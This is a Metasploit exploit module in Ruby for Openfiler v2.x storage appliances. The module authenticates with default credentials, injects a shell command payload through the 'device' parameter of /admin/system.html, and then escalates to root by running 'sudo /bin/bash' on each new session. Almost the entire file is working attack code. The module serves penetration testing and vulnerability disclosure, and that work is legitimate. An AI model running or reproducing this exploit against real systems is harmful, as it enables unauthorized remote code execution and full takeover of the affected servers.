# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Openfiler v2.x NetworkCard Command Execution",
            &#039;Description&#039;    => %q{
                This module exploits a vulnerability in Openfiler v2.x
                which could be abused to allow authenticated users to execute arbitrary
                code under the context of the &#039;openfiler&#039; user. The &#039;system.html&#039; file
                uses user controlled data from the &#039;device&#039; parameter to create a new
                &#039;NetworkCard&#039; object. The class constructor in &#039;network.inc&#039; calls exec()
                with the supplied data. The &#039;openfiler&#039; user may &#039;sudo /bin/bash&#039; without
                providing a system password.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Discovery and exploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;http://itsecuritysolutions.org/2012-09-06-Openfiler-v2.x-multiple-vulnerabilities/&#039;]
                    #[&#039;OSVDB&#039;, &#039;&#039;],
                    #[&#039;EDB&#039;,   &#039;&#039;],
                ],
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => &#039;none&#039;
                },
            &#039;Platform&#039;       => &#039;unix&#039;,
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 1024,
                    &#039;BadChars&#039;    => "\x00",
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic telnet python perl bash&#039;,
                        }
                },
            &#039;Targets&#039;        =>
                [
                    [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Sep 04 2012",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                Opt::RPORT(446),
                OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
                OptString.new(&#039;USERNAME&#039;, [true, &#039;The username for the application&#039;, &#039;openfiler&#039;]),
                OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password for the application&#039;, &#039;password&#039;])
            ], self.class)
    end
 
    def check
 
        @peer = "#{rhost}:#{rport}"
 
        # retrieve software version from login page
        print_status("#{@peer} - Sending check")
        begin
            res = send_request_cgi({
                &#039;uri&#039; => &#039;/&#039;
            })
 
            if    res and res.code == 200 and res.body =~ /<strong>Distro Release:&nbps;<\/strong>Openfiler [NE]SA 2\./
                return Exploit::CheckCode::Appears
            elsif res and res.code == 200 and res.body =~ /<title>Openfiler Storage Control Center<\/title>/
                return Exploit::CheckCode::Detected
            end
 
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            print_error("#{@peer} - Connection failed")
        end
        return Exploit::CheckCode::Unknown
 
    end
 
    def on_new_session(client)
        client.shell_command_token("sudo /bin/bash")
    end
 
 
    def exploit
 
        @peer = "#{rhost}:#{rport}"
        user  = datastore[&#039;USERNAME&#039;]
        pass  = datastore[&#039;PASSWORD&#039;]
        cmd   = Rex::Text.uri_encode("&#{payload.raw}&")
 
        # send payload
        print_status("#{@peer} - Sending payload (#{payload.raw.length} bytes)")
        begin
            res = send_request_cgi({
                &#039;uri&#039;    => "/admin/system.html?step=2&device=lo#{cmd}",
                &#039;cookie&#039; => "usercookie=#{user}; passcookie=#{pass};",
            }, 25)
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            fail_with(Exploit::Failure::Unknown, &#039;Connection failed&#039;)
        end
 
        if    res and res.code == 200 and res.body =~ /<title>System : Network Setup<\/title>/
            print_good("#{@peer} - Payload sent successfully")
        elsif res and res.code == 302 and res.headers[&#039;Location&#039;] =~ /\/index\.html\?redirect/
            fail_with(Exploit::Failure::NoAccess, &#039;Authentication failed&#039;)
        else
            fail_with(Exploit::Failure::Unknown, &#039;Sending payload failed&#039;)
        end
 
    end
end



